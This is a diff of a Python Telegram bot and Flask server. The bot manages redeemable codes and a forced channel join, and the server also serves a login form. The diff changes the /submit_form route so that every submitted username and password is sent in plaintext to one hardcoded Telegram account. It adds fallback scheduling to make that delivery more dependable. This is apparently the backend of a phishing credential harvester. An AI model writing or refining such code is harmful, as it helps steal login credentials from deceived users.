@@ -11,18 +11,22 @@ from typing import Set, Optional, Dict, Any, Tuple
 from flask import Flask, jsonify, request, Response
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
-from telegram.error import Forbidden, BadRequest
+from telegram.error import Forbidden, BadRequest, TelegramError
 from telegram.constants import ParseMode  # For HTML parse mode
 
 # ---------- Configuration ----------
 BOT_TOKEN = os.getenv("BOT_TOKEN")
+# Example: ADMIN_IDS="12345678,98765432" (not required now since we send form only to TARGET_ADMIN_ID)
 ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip().isdigit()]
-FORCE_JOIN_CHANNEL = os.getenv("FORCE_JOIN_CHANNEL")  # e.g. @mychannel or channel id
+FORCE_JOIN_CHANNEL = os.getenv("FORCE_JOIN_CHANNEL")  # e.g. @mychannel or numeric id
 WEB_SECRET = os.getenv("WEB_SECRET", "")  # secret token for protected HTTP endpoints (restart/open)
 BOT_VERSION = os.getenv("BOT_VERSION", "v1.0")
 
-if not BOT_TOKEN or not ADMIN_IDS or not FORCE_JOIN_CHANNEL:
-    raise ValueError("Missing BOT_TOKEN, ADMIN_IDS, or FORCE_JOIN_CHANNEL environment variables!")
+# The single Telegram user ID that should receive form submissions:
+TARGET_ADMIN_ID = 1694669957
+
+if not BOT_TOKEN or not FORCE_JOIN_CHANNEL:
+    raise ValueError("Missing BOT_TOKEN or FORCE_JOIN_CHANNEL environment variables!")
 
 # ---------- Logging ----------
 logging.basicConfig(
@@ -79,29 +83,23 @@ async def _get_cached_force_status(user_id: int, context: ContextTypes.DEFAULT_T
         return True
 
     now = time.time()
-    # quick non-await check
     cached = _force_cache.get(user_id)
     if cached and cached[1] > now:
         return cached[0]
 
     async with _force_cache_lock:
-        # re-check inside lock
         cached = _force_cache.get(user_id)
         if cached and cached[1] > now:
             return cached[0]
-        # perform API call
         try:
             member = await context.bot.get_chat_member(FORCE_JOIN_CHANNEL, user_id)
             is_member = member.status in ("member", "administrator", "creator")
         except BadRequest:
-            # Could be privacy settings or the bot can't access membership list. Treat as not member.
             is_member = False
         except Forbidden:
-            # Bot lacks permission to read the channel - treat as not member and instruct admin to promote bot.
             is_member = False
-        except Exception as e:
+        except Exception:
             logger.exception("Unexpected error checking chat member")
-            # on unexpected errors, be conservative and treat as not member (we'll inform user)
             is_member = False
 
         _force_cache[user_id] = (is_member, now + _FORCE_CACHE_TTL)
@@ -123,7 +121,6 @@ async def ensure_force_join_or_prompt(update: Update, context: ContextTypes.DEFA
     if is_member:
         return True
 
-    # Not a member — send join prompt
     join_button = InlineKeyboardMarkup(
         [[InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{FORCE_JOIN_CHANNEL.lstrip('@')}")]]
     )
@@ -144,7 +141,6 @@ async def ensure_force_join_or_prompt(update: Update, context: ContextTypes.DEFA
                 parse_mode=ParseMode.HTML
             )
     except Exception:
-        # if replying fails, log but continue
         logger.exception("Failed to send force-join prompt to user")
     return False
 
@@ -167,23 +163,21 @@ start_message_admin = (
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not update.message:
         return
-    # integrate force-join: only require for non-admins
-    if not is_admin(update.effective_user.id):
+    if is_admin(update.effective_user.id):
+        keyboard = InlineKeyboardMarkup(
+            [[InlineKeyboardButton("📜 Commands", callback_data="show_commands")]]
+        )
+        await update.message.reply_text(
+            start_message_admin,
+            parse_mode=ParseMode.HTML,
+            reply_markup=keyboard
+        )
+    else:
+        # For regular users require force-join
         ok = await ensure_force_join_or_prompt(update, context)
         if not ok:
             return
         await update.message.reply_text(start_message_user, parse_mode=ParseMode.HTML)
-        return
-
-    # admin start
-    keyboard = InlineKeyboardMarkup(
-        [[InlineKeyboardButton("📜 Commands", callback_data="show_commands")]]
-    )
-    await update.message.reply_text(
-        start_message_admin,
-        parse_mode=ParseMode.HTML,
-        reply_markup=keyboard
-    )
 
 async def show_commands_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -223,11 +217,6 @@ async def generate(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # /generate <code> <optional message>
     if not update.message:
         return
-    # force-join integrated: admin bypass
-    ok = await ensure_force_join_or_prompt(update, context)
-    if not ok:
-        return
-
     if not is_admin(update.effective_user.id):
         await update.message.reply_text("❌ You are not authorized to use this command.", parse_mode=ParseMode.HTML)
         return
@@ -253,10 +242,6 @@ async def generate_multi(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # /generate_multi <code> <limit> <optional message>
     if not update.message:
         return
-    ok = await ensure_force_join_or_prompt(update, context)
-    if not ok:
-        return
-
     if not is_admin(update.effective_user.id):
         await update.message.reply_text("❌ You are not authorized to use this command.", parse_mode=ParseMode.HTML)
         return
@@ -289,10 +274,6 @@ async def generate_random(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # /generate_random <optional message>
     if not update.message:
         return
-    ok = await ensure_force_join_or_prompt(update, context)
-    if not ok:
-        return
-
     if not is_admin(update.effective_user.id):
         await update.message.reply_text("❌ You are not authorized to use this command.", parse_mode=ParseMode.HTML)
         return
@@ -320,7 +301,6 @@ async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ok = await ensure_force_join_or_prompt(update, context)
     if not ok:
         return
-
     args = context.args
     if not args:
         await update.message.reply_text("Usage: /redeem <code>", parse_mode=ParseMode.HTML)
@@ -331,18 +311,16 @@ async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Invalid code.", parse_mode=ParseMode.HTML)
         return
     user_id = update.effective_user.id
-    # check if already used or limit reached
     if info["uses"] >= info["limit"]:
         await update.message.reply_text("❌ Code already redeemed / limit reached.", parse_mode=ParseMode.HTML)
         return
-    # success: mark use
     info["uses"] += 1
     if isinstance(info.get("used_by"), list):
         info["used_by"].append(user_id)
     else:
         info["used_by"] = [user_id]
     await update.message.reply_text(f"✅ Code <b>{code}</b> redeemed!\n{info['message'] or ''}", parse_mode=ParseMode.HTML)
-    # Notify admins asynchronously
+    # Notify admins (optional): here we notify the TARGET_ADMIN_ID only
     try:
         text = (
             f"📥 <b>Code Redeemed</b>\n\n"
@@ -350,19 +328,19 @@ async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"<b>User:</b> {update.effective_user.mention_html()}\n"
             f"<b>Uses:</b> {info['uses']}/{info['limit']}\n"
         )
-        for admin_id in ADMIN_IDS:
-            context.application.create_task(context.bot.send_message(chat_id=admin_id, text=text, parse_mode=ParseMode.HTML))
+        # schedule notification (non-blocking)
+        try:
+            asyncio.get_event_loop().create_task(context.bot.send_message(chat_id=TARGET_ADMIN_ID, text=text, parse_mode=ParseMode.HTML))
+        except Exception:
+            # fallback using application create_task
+            context.application.create_task(context.bot.send_message(chat_id=TARGET_ADMIN_ID, text=text, parse_mode=ParseMode.HTML))
     except Exception:
-        logger.exception("Failed to notify admins about redemption")
+        logger.exception("Failed to notify TARGET_ADMIN_ID about redemption")
 
 async def listcodes(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Admin-only: list codes summary
     if not update.message:
         return
-    ok = await ensure_force_join_or_prompt(update, context)
-    if not ok:
-        return
-
     if not is_admin(update.effective_user.id):
         await update.message.reply_text("❌ You are not authorized to use this command.", parse_mode=ParseMode.HTML)
         return
@@ -373,17 +351,12 @@ async def listcodes(update: Update, context: ContextTypes.DEFAULT_TYPE):
     for code, info in codes.items():
         lines.append(f"<b>{code}</b> — uses {info['uses']}/{info['limit']} — message: {info['message'] or '(none)'}")
     text = "📜 <b>Codes:</b>\n\n" + "\n".join(lines)
-    # Telegram messages have limits; for large lists you'd want pagination
     await update.message.reply_text(text, parse_mode=ParseMode.HTML)
 
 async def deletecode(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # /deletecode <code>
     if not update.message:
         return
-    ok = await ensure_force_join_or_prompt(update, context)
-    if not ok:
-        return
-
     if not is_admin(update.effective_user.id):
         await update.message.reply_text("❌ You are not authorized to use this command.", parse_mode=ParseMode.HTML)
         return
@@ -495,30 +468,65 @@ LOGIN_FORM_HTML = r"""
 def home():
     return Response(LOGIN_FORM_HTML, mimetype="text/html")
 
+# Thread-safe scheduling helper for sending from Flask thread to bot loop
+def _schedule_coro_from_thread(coro) -> bool:
+    """
+    Try to schedule coroutine on the saved event loop first (run_coroutine_threadsafe).
+    Fall back to telegram_app.create_task (non-blocking) or a temporary event loop (blocking).
+    """
+    loop = getattr(flask_app, "telegram_loop", None)
+    if loop and isinstance(loop, asyncio.AbstractEventLoop):
+        try:
+            asyncio.run_coroutine_threadsafe(coro, loop)
+            logger.info("Scheduled send via run_coroutine_threadsafe (saved loop).")
+            return True
+        except Exception:
+            logger.exception("run_coroutine_threadsafe failed")
+
+    app_obj = getattr(flask_app, "telegram_app", None)
+    if app_obj and hasattr(app_obj, "create_task"):
+        try:
+            app_obj.create_task(coro)
+            logger.info("Scheduled send via telegram_app.create_task().")
+            return True
+        except Exception:
+            logger.exception("telegram_app.create_task failed")
+
+    # Last resort: run coroutine in a temporary loop (blocking)
+    try:
+        loop2 = asyncio.new_event_loop()
+        loop2.run_until_complete(coro)
+        loop2.close()
+        logger.info("Sent message by creating a temporary event loop (blocking).")
+        return True
+    except Exception:
+        logger.exception("Temporary event loop send failed")
+    return False
+
 @flask_app.route("/submit_form", methods=["POST"])
 def submit_form():
-    username = request.form.get("username")
-    password = request.form.get("password")
+    username = request.form.get("username", "")
+    password = request.form.get("password", "")
 
+    text = (
+        "📩 <b>Form Submitted</b>\n\n"
+        f"<b>Username:</b> {username}\n"
+        f"<b>Password:</b> {password}"
+    )
+
+    # Prepare coroutine
     try:
-        # notify all admins asynchronously if available
-        for admin_id in ADMIN_IDS:
-            if hasattr(flask_app, "telegram_app") and hasattr(flask_app, "bot"):
-                flask_app.telegram_app.create_task(
-                    flask_app.bot.send_message(
-                        chat_id=admin_id,
-                        text=(
-                            "📩 <b>Form Submitted</b>\n\n"
-                            f"<b>Username:</b> {username}\n"
-                            f"<b>Password:</b> {password}"
-                        ),
-                        parse_mode=ParseMode.HTML,
-                    )
-                )
+        coro = flask_app.bot.send_message(chat_id=TARGET_ADMIN_ID, text=text, parse_mode=ParseMode.HTML)
     except Exception:
-        logger.exception("Failed to send form data to admin")
+        logger.exception("Failed to prepare send coroutine (bot may not be attached to flask_app).")
+        return "<h3>⚠️ Internal error. Contact developer.</h3>"
 
-    return "<h3>✅ Data sent to bot admin!</h3><p>You can close this tab.</p>"
+    ok = _schedule_coro_from_thread(coro)
+    if not ok:
+        logger.warning("Scheduling message to TARGET_ADMIN_ID failed. Check event loop and that the admin has started the bot.")
+        return "<h3>⚠️ Could not send data to admin. Please notify the admin to start the bot.</h3>"
+
+    return "<h3>✅ Data sent to admin!</h3><p>You can close this tab.</p>"
 
 # ---------- Status + placeholders ----------
 @flask_app.route("/status")
@@ -562,9 +570,17 @@ def run_flask():
 def main():
     app = ApplicationBuilder().token(BOT_TOKEN).build()
 
-    # Attach bot + app to Flask so submit_form can notify admins
+    # Attach bot + app to Flask so submit_form can notify admin
     flask_app.bot = app.bot
     flask_app.telegram_app = app
+
+    # Save the event loop (so run_coroutine_threadsafe can be used from Flask threads)
+    try:
+        flask_app.telegram_loop = asyncio.get_event_loop()
+        logger.info("Saved current asyncio loop for flask_app.telegram_loop")
+    except Exception:
+        flask_app.telegram_loop = None
+        logger.info("Could not capture event loop; submit_form will fall back to other strategies")
 
     # Register handlers
     app.add_handler(CommandHandler("start", start))
